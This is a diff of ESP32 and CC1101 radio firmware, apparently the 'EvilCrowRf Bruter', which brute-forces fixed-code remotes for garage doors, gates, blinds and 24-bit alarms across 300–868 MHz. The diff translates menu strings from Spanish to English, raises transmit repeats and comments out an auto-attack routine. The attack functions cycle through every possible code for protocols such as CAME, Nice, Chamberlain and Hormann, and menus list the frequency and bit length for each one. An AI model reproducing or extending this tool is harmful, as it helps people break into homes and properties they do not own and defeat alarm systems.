@@ -3,7 +3,7 @@
 #include <SPI.h>
 #include <BluetoothSerial.h> 
 
-// --- MEGA INCLUDES DE TODOS LOS PROTOCOLOS ---
+// --- MEGA INCLUDES ---
 #include "protocols/protocol.h"
 #include "protocols/Came.h"
 #include "protocols/NiceFlo.h"
@@ -38,7 +38,7 @@
 #include "protocols/Magellen.h"
 #include "protocols/Phox.h"
 #include "protocols/Unilarm.h"
-#include "config.h" // [NUEVO] Configuración centralizada
+#include "config.h" 
 
 // [NUEVO] Prototipos externos
 void menuDeBruijn();
@@ -48,14 +48,14 @@ void runScanner();
 #define RF2_GDO0 PIN_RF_GDO0
 #define RF2_TX   PIN_RF_TX
 
-// [NUEVO] Objeto Bluetooth
+
 BluetoothSerial SerialBT;
 
-int globalRepeats = 4;
+int globalRepeats = 10;
 float current_mhz = 0;
 unsigned long lastInteraction = 0;
 
-// --- WRAPPERS PARA DUAL OUTPUT (USB + BLUETOOTH) ---
+// --- WRAPPERS DUAL OUTPUT (USB + BLUETOOTH) ---
 void dualPrint(String s) {
     Serial.print(s);
     SerialBT.print(s);
@@ -74,7 +74,7 @@ void dualPrintf(const char* format, ...) {
     SerialBT.write((uint8_t*)buf, strlen(buf));
 }
 
-// --- WRAPPERS PARA DUAL INPUT ---
+// --- WRAPPERS DUAL INPUT ---
 int anyAvailable() {
     return Serial.available() + SerialBT.available();
 }
@@ -101,7 +101,7 @@ void setupCC1101() {
     ELECHOUSE_cc1101.addSpiPin(PIN_RF_SCK, PIN_RF_MISO, PIN_RF_MOSI, RF2_CS, 1);
     ELECHOUSE_cc1101.addGDO0(RF2_GDO0, 1);
     ELECHOUSE_cc1101.setModul(1); 
-    if (!ELECHOUSE_cc1101.getCC1101()) while (1) { dualPrintln("ERROR: CC1101 no detectado"); delay(1000); }
+    if (!ELECHOUSE_cc1101.getCC1101()) while (1) { dualPrintln("ERROR: CC1101 not detected"); delay(1000); }
     ELECHOUSE_cc1101.Init();
     ELECHOUSE_cc1101.setPktFormat(3);   
     ELECHOUSE_cc1101.setModulation(2);  
@@ -116,18 +116,18 @@ void sendPulse(int duration) {
     delayMicroseconds(abs(duration));
 }
 
-// Retorna: 0=Continuar, 1=Saltar Actual, 2=Cancelar Todo
+
 int checkPause() {
     if (anyAvailable() > 0) {
         char c = anyRead();
         if (c == 'c' || c == 'C') {
-            dualPrintln("\n[PAUSA] Opciones: (S)altar actual | (C)ancelar todo | (R)eanudar");
+            dualPrintln("\n[PAUSE] Options: (SS)Skip | (CC)ancel all | (RR)esume");
             while(anyAvailable() == 0) delay(10);
             char opt = anyRead();
             clearBuffers();
-            if (opt == 'S' || opt == 's') { dualPrintln(">>> Saltando al siguiente..."); return 1; } // Skip current
-            if (opt == 'C' || opt == 'c') { dualPrintln(">>> Cancelando todo."); return 2; } // Cancel all
-            dualPrintln(">>> Reanudando...");
+            if (opt == 'S' || opt == 's') { dualPrintln(">>> Jumping to next..."); return 1; } // Skip current
+            if (opt == 'C' || opt == 'c') { dualPrintln(">>> Canceling all."); return 2; } // Cancel all
+            dualPrintln(">>> Resuming...");
             return 0;
         }
     }
@@ -138,7 +138,7 @@ int checkPause() {
 bool attackBinary(c_rf_protocol* proto, const char* name, int bits, float mhz) {
     setFrequencyCorrected(mhz);
     uint32_t total = (1 << bits);
-    dualPrintf("\n>>> Iniciando %s (%d bits) a %.2f MHz <<<", name, bits, mhz);
+    dualPrintf("\n>>> Iniciating %s (%d bits) at %.2f MHz <<<", name, bits, mhz);
     for (uint32_t i = 0; i < total; i++) {
         if (i % 500 == 0) dualPrintf("  [%s] %.1f%%\n", name, (i * 100.0) / total);
         
@@ -165,7 +165,7 @@ bool attackTristate(c_rf_protocol* proto, const char* name, int positions, float
     setFrequencyCorrected(mhz);
     uint32_t total = 1;
     for(int p=0; p<positions; p++) total *= 3;
-    dualPrintf("\n>>> Iniciando %s (%d pos) a %.2f MHz <<<", name, positions, mhz);
+    dualPrintf("\n>>> Iniciating %s (%d pos) at %.2f MHz <<<", name, positions, mhz);
     for (uint32_t i = 0; i < total; i++) {
         if (i % 500 == 0) dualPrintf("  [%s] %.1f%%\n", name, (i * 100.0) / total);
         
@@ -200,24 +200,28 @@ char waitKey() {
 }
 
 void subMenuRepeats() {
-    dualPrintln("\n--- CONFIGURAR REPETICIONES ---");
-    dualPrintf("Actual: %d veces por codigo\n", globalRepeats);
-    dualPrintln("Introduce un numero (1-9):");
+    dualPrintln("\n--- CONFIGURE REPEATS ---");
+    dualPrintf("Current: %d times per code\n", globalRepeats);
+    dualPrintln("Enter a number:");
     char c = waitKey();
-    if (c >= '1' && c <= '9') { globalRepeats = c - '0'; dualPrintf("OK! Ajustado a %d\n", globalRepeats); }
+    if (c >= '1' && c <= '9') {
+        globalRepeats = c - '0';
+        dualPrintf("OK! Set to %d\n", globalRepeats);
+    }
 }
+
 
 // --- SUBMENÚS POR CATEGORÍA ---
 
 void menu1() {
     while(true) {
-        dualPrintln("\n[1] MANDOS EUROPEOS (433.92)");
-        dualPrintln("0. ATACAR TODO EL BLOQUE");
+        dualPrintln("\n[1] European Remotes (433.92)");
+        dualPrintln("0. ATTACK ALL EUROPEAN PROTOCOLS");
         dualPrintln("1. CAME (12 & 24 bits)");
         dualPrintln("2. NiceFlo (12 & 24 bits)");
         dualPrintln("3. Clemsa / FAAC / BFT / Ansonic");
         dualPrintln("4. Gate-TX / Phox / Prastel / PhoenixV2");
-        dualPrintln("B. Volver");
+        dualPrintln("B. Back");
         char c = waitKey();
         if (c == 'B' || c == 'b') return;
         if (c == '0' || c == '1') { protocol_came p; if(!attackBinary(&p, "CAME 12b", 12, 433.92)) return; if(!attackBinary(&p, "CAME 24b", 24, 433.92)) return; }
@@ -239,12 +243,12 @@ void menu1() {
 
 void menu2() {
     while(true) {
-        dualPrintln("\n[2] MANDOS TRISTATE (Princeton/Chinos)");
-        dualPrintln("0. ATACAR TODO (Princeton + SMC)");
+        dualPrintln("\n[2] TRISTATE CONTROLS (Princeton/Chinese)");
+        dualPrintln("0. ATTACK ALL (Princeton + SMC)");
         dualPrintln("1. Princeton (315 MHz)");
         dualPrintln("2. Princeton (433.92 MHz)");
         dualPrintln("3. SMC5326 (315 / 433.42 MHz)");
-        dualPrintln("B. Volver");
+        dualPrintln("B. Back");
         char c = waitKey();
         if (c == 'B' || c == 'b') return;
         protocol_princeton p1; protocol_smc5326 p2;
@@ -256,12 +260,12 @@ void menu2() {
 
 void menu3() {
     while(true) {
-        dualPrintln("\n[3] DOMOTICA Y SENSORES");
+        dualPrintln("\n[3] Home Automation / Blinds");
         dualPrintln("1. Dooya (Persianas) - 433.92");
         dualPrintln("2. Honeywell WBD - 433.92");
         dualPrintln("3. Nero Radio / Nero Sketch");
         dualPrintln("4. Magellen - 433.92");
-        dualPrintln("B. Volver");
+        dualPrintln("B. Back");
         char c = waitKey();
         if (c == 'B' || c == 'b') return;
         if (c == '1') { protocol_dooya p; if(!attackBinary(&p, "Dooya", 24, 433.92)) return; }
@@ -276,7 +280,7 @@ void menu4() {
         dualPrintln("\n[4] USA GARAGE (Chamberlain/Liftmaster)");
         dualPrintln("1. Chamberlain 7,8,9,12 bits (300/315/390/433)");
         dualPrintln("2. Liftmaster (310/318/390/433)");
-        dualPrintln("B. Volver");
+        dualPrintln("B. Back");
         char c = waitKey();
         if (c == 'B' || c == 'b') return;
         if (c == '1') { protocol_chamberlain p; for(float f : {300.0, 315.0, 390.0, 433.92}) for(int b : {7, 8, 9, 12}) if(!attackBinary(&p, "Chamberlain", b, f)) return; }
@@ -286,12 +290,12 @@ void menu4() {
 
 void menu5() {
     while(true) {
-        dualPrintln("\n[5] AMERICANOS ANTIGUOS");
+        dualPrintln("\n[5] USA OLD CONTROLS (Linear/Firefly/MegaCode)");
         dualPrintln("1. Linear (10 bits) - 300/310 MHz");
         dualPrintln("2. Linear Delta 3 - 318 MHz");
         dualPrintln("3. Linear MegaCode - 318 MHz");
         dualPrintln("4. Firefly - 300 MHz");
-        dualPrintln("B. Volver");
+        dualPrintln("B. Back");
         char c = waitKey();
         if (c == 'B' || c == 'b') return;
         if (c == '1') { protocol_linear p; if(!attackBinary(&p, "Linear 300", 10, 300.00)) return; if(!attackBinary(&p, "Linear 310", 10, 310.00)) return; }
@@ -303,12 +307,12 @@ void menu5() {
 
 void menu6() {
     while(true) {
-        dualPrintln("\n[6] ALTA SEGURIDAD / 868 MHz");
-        dualPrintln("[!] WARN: Rolling Code NO abrira (Solo Fixed)");
+        dualPrintln("\n[6] High Security / 868 MHz");
+        dualPrintln("[!] WARN: Rolling Code won't open (Fixed only)");
         dualPrintln("1. Hormann HSM - 868.35 MHz");
         dualPrintln("2. Marantec - 868.35 MHz");
         dualPrintln("3. Berner - 868.35 MHz");
-        dualPrintln("B. Volver");
+        dualPrintln("B. Back");
         char c = waitKey();
         if (c == 'B' || c == 'b') return;
         if (c == '1') { protocol_hormann p; if(!attackBinary(&p, "Hormann", 12, 868.35)) return; }
@@ -318,23 +322,23 @@ void menu6() {
 }
 
 void menu7() {
-    dualPrintln("\n[7] INICIANDO INTERTECHNO V3 (32 BITS)...");
+    dualPrintln("\n[7] STARTING INTERTECHNO V3 (32 BITS)...");
     protocol_intertechno_v3 p; attackBinary(&p, "Intertechno", 32, 433.92);
 }
 
 void menu8() {
-    dualPrintln("\n[8] INICIANDO ALARMAS 24 BITS (EV1527)...");
+    dualPrintln("\n[8] STARTING ALARMAS 24 BITS (EV1527)...");
     protocol_ev1527 p; attackBinary(&p, "EV1527", 24, 433.92);
 }
 
 void menu9() {
     while(true) {
-        dualPrintln("\n[9] OTROS PROTOCOLOS");
+        dualPrintln("\n[9] OTHERS / MISC PROTOCOLS");
         dualPrintln("1. StarLine (Static)");
         dualPrintln("2. Unilarm");
         dualPrintln("3. Tedsen / Teletaster");
         dualPrintln("4. Airforce / Berner 433");
-        dualPrintln("B. Volver");
+        dualPrintln("B. Back");
         char c = waitKey();
         if (c == 'B' || c == 'b') return;
         if (c == '1') { protocol_starline p; if(!attackBinary(&p, "StarLine", 12, 433.92)) return; }
@@ -346,69 +350,66 @@ void menu9() {
 
 void showMainMenu() {
     dualPrintln("\n==========================================");
-    dualPrintln("   MEGA BRUTE FORCE 2026 - ULTIMATE      ");
-    dualPrintln("   (Control via USB or BLUETOOTH)        ");
+    dualPrintln("   EvilCrowRf Bruter - Open Source Edition      ");
+    dualPrintln("        (USB or BLUETOOTH Controlled)       ");
     dualPrintln("==========================================");
     dualPrintln("1. Europe Mandos (CAME, Nice, Clemsa...)");
     dualPrintln("2. Tristate / Chinos (Princeton, SMC...)");
-    dualPrintln("3. Domotica / Persianas (Dooya, Nero...)");
+    dualPrintln("3. Home Automation / Blinds (Dooya, Nero...)");
     dualPrintln("4. USA Garage (Chamberlain, Liftmaster)");
     dualPrintln("5. USA Old (Linear, Firefly, MegaCode)");
     dualPrintln("6. Europe 868 MHz (Hormann, Marantec)");
     dualPrintln("7. Intertechno V3 (32 bits)");
-    dualPrintln("8. Alarmas 24 bits (EV1527)");
-    dualPrintln("9. Otros (StarLine, Tedsen, Airforce)");
+    dualPrintln("8. Alarms 24 bits (EV1527)");
+    dualPrintln("9. Others (StarLine, Tedsen, Airforce)");
     dualPrintln("S. RF SIGNAL SCANNER (Find Freq)");
     dualPrintln("D. DE BRUIJN ATTACK (Universal / Presets)");
-    dualPrintln("R. Ajustar REPETICIONES (Actual: " + String(globalRepeats) + ")");
+    dualPrintln("R. Set repetitions (Actual value: " + String(globalRepeats) + ")");
     dualPrintln("==========================================");
 }
 
-void attackEverything() {
-    dualPrintln("\n[!] TIEMPO AGOTADO: AUTO-ATTACK (SPAIN & FASTEST FIRST)...");
+// void attackEverything() {
+//     dualPrintln("\n[!] TIEMPO AGOTADO: AUTO-ATTACK (SPAIN & FASTEST FIRST)...");
     
-    // 1. ESPAÑA / EUROPE 12 BITS (Rápidos)
-    protocol_clemsa p_clemsa; if(!attackBinary(&p_clemsa, "Clemsa", 12, 433.92)) return;
-    protocol_came p_came; if(!attackBinary(&p_came, "CAME 12b", 12, 433.92)) return;
-    protocol_nice_flo p_nice; if(!attackBinary(&p_nice, "NiceFlo 12b", 12, 433.92)) return;
-    protocol_faac p_faac; if(!attackBinary(&p_faac, "FAAC", 12, 433.92)) return;
-    protocol_bft_fixed p_bft; if(!attackBinary(&p_bft, "BFT", 12, 433.92)) return;
-    protocol_ansonic p_ansonic; if(!attackBinary(&p_ansonic, "Ansonic", 12, 433.92)) return;
+//     // 1. ESPAÑA / EUROPE 12 BITS (Rápidos)
+//     protocol_clemsa p_clemsa; if(!attackBinary(&p_clemsa, "Clemsa", 12, 433.92)) return;
+//     protocol_came p_came; if(!attackBinary(&p_came, "CAME 12b", 12, 433.92)) return;
+//     protocol_nice_flo p_nice; if(!attackBinary(&p_nice, "NiceFlo 12b", 12, 433.92)) return;
+//     protocol_faac p_faac; if(!attackBinary(&p_faac, "FAAC", 12, 433.92)) return;
+//     protocol_bft_fixed p_bft; if(!attackBinary(&p_bft, "BFT", 12, 433.92)) return;
+//     protocol_ansonic p_ansonic; if(!attackBinary(&p_ansonic, "Ansonic", 12, 433.92)) return;
     
-    // 2. OTROS EUROPEOS 12 BITS
-    protocol_gate_tx p_gate; if(!attackBinary(&p_gate, "GateTX", 12, 433.92)) return;
-    protocol_phox p_phox; if(!attackBinary(&p_phox, "Phox", 12, 433.92)) return;
-    protocol_prastel p_prastel; if(!attackBinary(&p_prastel, "Prastel", 12, 433.92)) return;
-    protocol_phoenix_v2 p_phoenix; if(!attackBinary(&p_phoenix, "PhoenixV2", 12, 433.92)) return;
+//     // 2. OTROS EUROPEOS 12 BITS
+//     protocol_gate_tx p_gate; if(!attackBinary(&p_gate, "GateTX", 12, 433.92)) return;
+//     protocol_phox p_phox; if(!attackBinary(&p_phox, "Phox", 12, 433.92)) return;
+//     protocol_prastel p_prastel; if(!attackBinary(&p_prastel, "Prastel", 12, 433.92)) return;
+//     protocol_phoenix_v2 p_phoenix; if(!attackBinary(&p_phoenix, "PhoenixV2", 12, 433.92)) return;
     
-    // 3. TRISTATE / CHINOS
-    protocol_princeton p_princeton; 
-    if(!attackTristate(&p_princeton, "Princeton 433", 12, 433.92)) return;
-    protocol_smc5326 p_smc;
-    if(!attackTristate(&p_smc, "SMC5326 433", 12, 433.42)) return;
+//     // 3. TRISTATE / CHINOS
+//     protocol_princeton p_princeton; 
+//     if(!attackTristate(&p_princeton, "Princeton 433", 12, 433.92)) return;
+//     protocol_smc5326 p_smc;
+//     if(!attackTristate(&p_smc, "SMC5326 433", 12, 433.42)) return;
 
-    // 4. LARGOS / DOMOTICA
-    if(!attackBinary(&p_came, "CAME 24b", 24, 433.92)) return;
-    if(!attackBinary(&p_nice, "NiceFlo 24b", 24, 433.92)) return;
-    protocol_ev1527 p_ev; if(!attackBinary(&p_ev, "EV1527", 24, 433.92)) return;
-    protocol_dooya p_dooya; if(!attackBinary(&p_dooya, "Dooya", 24, 433.92)) return;
+//     // 4. LARGOS / DOMOTICA
+//     if(!attackBinary(&p_came, "CAME 24b", 24, 433.92)) return;
+//     if(!attackBinary(&p_nice, "NiceFlo 24b", 24, 433.92)) return;
+//     protocol_ev1527 p_ev; if(!attackBinary(&p_ev, "EV1527", 24, 433.92)) return;
+//     protocol_dooya p_dooya; if(!attackBinary(&p_dooya, "Dooya", 24, 433.92)) return;
     
-    // 5. 868 MHz
-    protocol_hormann p_hormann; if(!attackBinary(&p_hormann, "Hormann", 12, 868.35)) return;
-    protocol_marantec p_marantec; if(!attackBinary(&p_marantec, "Marantec", 12, 868.35)) return;
-    protocol_berner p_berner; if(!attackBinary(&p_berner, "Berner", 12, 868.35)) return;
+//     // 5. 868 MHz
+//     protocol_hormann p_hormann; if(!attackBinary(&p_hormann, "Hormann", 12, 868.35)) return;
+//     protocol_marantec p_marantec; if(!attackBinary(&p_marantec, "Marantec", 12, 868.35)) return;
+//     protocol_berner p_berner; if(!attackBinary(&p_berner, "Berner", 12, 868.35)) return;
 
-    // 6. USA / RESTO
-    protocol_chamberlain p_chamb; if(!attackBinary(&p_chamb, "Chamberlain", 12, 315.00)) return; if(!attackBinary(&p_chamb, "Chamberlain", 12, 390.00)) return;
-    protocol_liftmaster p_lift; if(!attackBinary(&p_lift, "Liftmaster", 12, 315.00)) return; if(!attackBinary(&p_lift, "Liftmaster", 12, 390.00)) return;
-    protocol_linear p_lin; if(!attackBinary(&p_lin, "Linear 300", 10, 300.00)) return;
-}
+//     // 6. USA / RESTO
+//     protocol_chamberlain p_chamb; if(!attackBinary(&p_chamb, "Chamberlain", 12, 315.00)) return; if(!attackBinary(&p_chamb, "Chamberlain", 12, 390.00)) return;
+//     protocol_liftmaster p_lift; if(!attackBinary(&p_lift, "Liftmaster", 12, 315.00)) return; if(!attackBinary(&p_lift, "Liftmaster", 12, 390.00)) return;
+//     protocol_linear p_lin; if(!attackBinary(&p_lin, "Linear 300", 10, 300.00)) return;
+// }
 
 void setup() {
     Serial.begin(115200);
-    
-    // [NUEVO] Iniciar Bluetooth
-    // El nombre que veras en el movil es "Mega-Brute-Force-RF" 
     SerialBT.begin(BT_DEVICE_NAME); 
     
     delay(2000);
@@ -420,7 +421,7 @@ void setup() {
 void loop() {
     if (anyAvailable() > 0) {
         char c = anyRead();
-        clearBuffers(); // Limpiar el resto
+        clearBuffers();
         
         switch(c) {
             case '1': menu1(); break;
